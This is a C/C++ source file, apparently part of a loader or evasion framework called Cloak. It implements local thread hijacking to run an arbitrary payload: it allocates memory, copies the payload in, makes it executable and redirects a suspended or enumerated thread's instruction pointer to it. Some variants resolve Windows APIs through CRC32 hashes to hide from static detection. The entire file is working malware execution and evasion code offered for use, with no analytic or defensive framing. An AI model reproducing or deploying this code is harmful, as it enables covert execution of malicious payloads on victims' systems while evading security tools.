#include "Cloak.hpp"

#if defined(HASH_API) && ( defined(LOCAL_THREAD_HIJACK) || defined(LOCAL_THREAD_HIJACK_ENUM) )
#include "Hash.hpp"
#endif // !HASH_API

#ifdef LOCAL_THREAD_HIJACK

VOID GottaCatchEmAll() {
    int i = rand();
    int j = rand();
    int k = i + j;
    int l = k * i / j;
}

#ifdef HASH_API

BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCreateThread pCreateThread = ( fnCreateThread ) GetProcAddressH( hKernel32, CreateThread_CRC32A );
    if ( pCreateThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
    if ( pVirtualProtect == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualProtect\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnGetThreadContext pGetThreadContext = ( fnGetThreadContext ) GetProcAddressH( hKernel32, GetThreadContext_CRC32A );
    if ( pGetThreadContext == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for GetThreadContext\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnSetThreadContext pSetThreadContext = ( fnSetThreadContext ) GetProcAddressH( hKernel32, SetThreadContext_CRC32A );
    if ( pSetThreadContext == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for SetThreadContext\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnResumeThread pResumeThread = ( fnResumeThread ) GetProcAddressH( hKernel32, ResumeThread_CRC32A );
    if ( pResumeThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for ResumeThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_CRC32A );
    if ( pWaitForSingleObject == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for WaitForSingleObject\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    // ---

    DWORD   dwOldProtect        = NULL;
    PVOID   pPayloadAddress     = NULL;
    HANDLE  hThread             = NULL;
    CONTEXT cThreadContext      = { .ContextFlags = CONTEXT_CONTROL };

    hThread = pCreateThread( NULL, NULL, ( LPTHREAD_START_ROUTINE ) &GottaCatchEmAll, NULL, CREATE_SUSPENDED, NULL );
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = pVirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    if ( ! pGetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] GetThreadContext Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    cThreadContext.Rip = ( DWORD64 ) pPayloadAddress;

    if ( ! pSetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] SetThreadContext Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pResumeThread( hThread );

    pWaitForSingleObject( hThread, WAIT_TIME );

    return TRUE;
}

#else

BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    DWORD   dwOldProtect        = NULL;
    PVOID   pPayloadAddress     = NULL;
    HANDLE  hThread             = NULL;
    CONTEXT cThreadContext      = { .ContextFlags = CONTEXT_CONTROL };

    hThread = CreateThread( NULL, NULL, ( LPTHREAD_START_ROUTINE ) &GottaCatchEmAll, NULL, CREATE_SUSPENDED, NULL );
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    if ( ! GetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] GetThreadContext Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    cThreadContext.Rip = ( DWORD64 ) pPayloadAddress;

    if ( ! SetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] SetThreadContext Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    ResumeThread( hThread );

    WaitForSingleObject( hThread, WAIT_TIME );

    return TRUE;
}

#endif // !HASH_API

#endif // !LOCAL_THREAD_HIJACK

#ifdef LOCAL_THREAD_HIJACK_ENUM

#include <tlhelp32.h>

#ifdef HASH_API

BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnGetCurrentProcessId pGetCurrentProcessId = ( fnGetCurrentProcessId ) GetProcAddressH( hKernel32, GetCurrentProcessId_CRC32A );
    if ( pGetCurrentProcessId == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pGetCurrentProcessId\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnGetCurrentThreadId pGetCurrentThreadId = ( fnGetCurrentThreadId ) GetProcAddressH( hKernel32, GetCurrentThreadId_CRC32A );
    if ( pGetCurrentProcessId == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pGetCurrentThreadId\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCreateToolhelp32Snapshot pCreateToolhelp32Snapshot = ( fnCreateToolhelp32Snapshot ) GetProcAddressH( hKernel32, CreateToolhelp32Snapshot_CRC32A );
    if ( pCreateToolhelp32Snapshot == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pCreateToolhelp32Snapshot\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnThread32First pThread32First = ( fnThread32First ) GetProcAddressH( hKernel32, Thread32First_CRC32A );
    if ( pThread32First == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pThread32First\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCloseHandle pCloseHandle = ( fnCloseHandle ) GetProcAddressH( hKernel32, CloseHandle_CRC32A );
    if ( pCloseHandle == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pCloseHandle\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnOpenThread pOpenThread = ( fnOpenThread ) GetProcAddressH( hKernel32, OpenThread_CRC32A );
    if ( pOpenThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pOpenThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnThread32Next pThread32Next = ( fnThread32Next ) GetProcAddressH( hKernel32, Thread32Next_CRC32A );
    if ( pThread32Next == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pThread32Next\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
    if ( pVirtualProtect == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualProtect\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnSuspendThread pSuspendThread = ( fnSuspendThread ) GetProcAddressH( hKernel32, SuspendThread_CRC32A );
    if ( pSuspendThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for pSuspendThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnGetThreadContext pGetThreadContext = ( fnGetThreadContext ) GetProcAddressH( hKernel32, GetThreadContext_CRC32A );
    if ( pGetThreadContext == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for GetThreadContext\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnSetThreadContext pSetThreadContext = ( fnSetThreadContext ) GetProcAddressH( hKernel32, SetThreadContext_CRC32A );
    if ( pSetThreadContext == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for SetThreadContext\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnResumeThread pResumeThread = ( fnResumeThread ) GetProcAddressH( hKernel32, ResumeThread_CRC32A );
    if ( pResumeThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for ResumeThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_CRC32A );
    if ( pWaitForSingleObject == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for WaitForSingleObject\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    // ---

    DWORD           dwMainThread        = NULL;
    DWORD           dwTargetThread      = NULL;
    HANDLE          hThread             = NULL;
    PVOID           pPayloadAddress     = NULL;
    DWORD           dwPid               = pGetCurrentProcessId();
    DWORD           dwOldProtect        = NULL;
    HANDLE          hSnapshot           = NULL;
    THREADENTRY32   teThread            = { .dwSize = sizeof( THREADENTRY32 ) };
    CONTEXT         cThreadContext      = { .ContextFlags = CONTEXT_CONTROL };


    dwMainThread = pGetCurrentThreadId();

    hSnapshot = pCreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, NULL );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        #ifdef DEBUG
        printf( "[-] CreateToolhelp32Snapshot Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        return FALSE;
    }

    if ( ! pThread32First( hSnapshot, &teThread ) ) {
        #ifdef DEBUG
        printf( "[-] Thread32First Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        pCloseHandle(hSnapshot);

        return FALSE;
    }

    do {

        if ( teThread.th32OwnerProcessID == dwPid && teThread.th32ThreadID != dwMainThread ) {

            dwTargetThread = teThread.th32ThreadID;
            hThread = pOpenThread( THREAD_ALL_ACCESS, FALSE, teThread.th32ThreadID );
            if ( hThread == NULL ) {
                #ifdef DEBUG
                printf( "[-] OpenThread Failed with Error -> %d\n", GetLastError() );
                #endif // !DEBUG

                pCloseHandle(hSnapshot);

                return FALSE;
            }

            break;

        }

    } while ( pThread32Next( hSnapshot, &teThread ) );

    pCloseHandle(hSnapshot);

    if (dwTargetThread == NULL || hThread == NULL) {
	    return FALSE;
    }

    pPayloadAddress = pVirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pSuspendThread( hThread );

    if ( ! pGetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    cThreadContext.Rip = ( DWORD64 ) pPayloadAddress;

    if ( ! pSetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pResumeThread( hThread );

    pWaitForSingleObject( hThread, WAIT_TIME );

    return TRUE;
}


#else

BOOL LocalThreadHijack(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    DWORD           dwMainThread        = NULL;
    DWORD           dwTargetThread      = NULL;
    HANDLE          hThread             = NULL;
    PVOID           pPayloadAddress     = NULL;
    DWORD           dwPid               = GetCurrentProcessId();
    DWORD           dwOldProtect        = NULL;
    HANDLE          hSnapshot           = NULL;
    THREADENTRY32   teThread            = { .dwSize = sizeof( THREADENTRY32 ) };
    CONTEXT         cThreadContext      = { .ContextFlags = CONTEXT_CONTROL };


    dwMainThread = GetCurrentThreadId();

    hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, NULL );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        #ifdef DEBUG
        printf( "[-] CreateToolhelp32Snapshot Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        return FALSE;
    }

    if ( ! Thread32First( hSnapshot, &teThread ) ) {
        #ifdef DEBUG
        printf( "[-] Thread32First Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        CloseHandle(hSnapshot);

        return FALSE;
    }

    do {

        if ( teThread.th32OwnerProcessID == dwPid && teThread.th32ThreadID != dwMainThread ) {

            dwTargetThread = teThread.th32ThreadID;
            hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, teThread.th32ThreadID );
            if ( hThread == NULL ) {
                #ifdef DEBUG
                printf( "[-] OpenThread Failed with Error -> %d\n", GetLastError() );
                #endif // !DEBUG

                CloseHandle(hSnapshot);

                return FALSE;
            }

            break;

        }

    } while ( Thread32Next( hSnapshot, &teThread ) );

    CloseHandle(hSnapshot);

    if (dwTargetThread == NULL || hThread == NULL) {
	    return FALSE;
    }

    pPayloadAddress = VirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    SuspendThread( hThread );

    if ( ! GetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    cThreadContext.Rip = ( DWORD64 ) pPayloadAddress;

    if ( ! SetThreadContext( hThread, &cThreadContext ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    ResumeThread( hThread );

    WaitForSingleObject( hThread, WAIT_TIME );

    return TRUE;
}

#endif // !HASH_API

#endif // !LOCAL_THREAD_HIJACK_ENUM